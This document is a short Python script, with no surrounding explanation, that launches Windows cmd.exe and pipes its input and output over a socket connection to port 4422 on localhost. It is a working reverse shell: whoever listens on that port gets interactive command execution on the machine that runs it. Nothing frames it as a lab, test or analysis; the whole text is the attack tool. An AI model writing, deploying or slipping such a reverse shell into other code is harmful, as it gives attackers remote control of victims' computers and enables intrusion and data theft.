import socket
import os
import threading
import subprocess as sp;

p=sp.Popen(['cmd.exe'],stdin=sp.PIPE,stdout=sp.PIPE,stderr=sp.STDOUT)
s=socket.socket()
s.connect(('localhost',4422))

threading.Thread(target=exec,args=("while(True):o=os.read(p.stdout.fileno(),1024);s.send(o)",globals()),daemon=True).start()
#threading.Thread(target=exec,args=("while(True):i=s.recv(1024);os.write(p.stdin.fileno(),i)",globals())).start()
threading.Thread(target=exec, args=("while True: i = s.recv(1024); os.write(p.stdin.fileno(), i + b'\\r\\n')", globals())).start()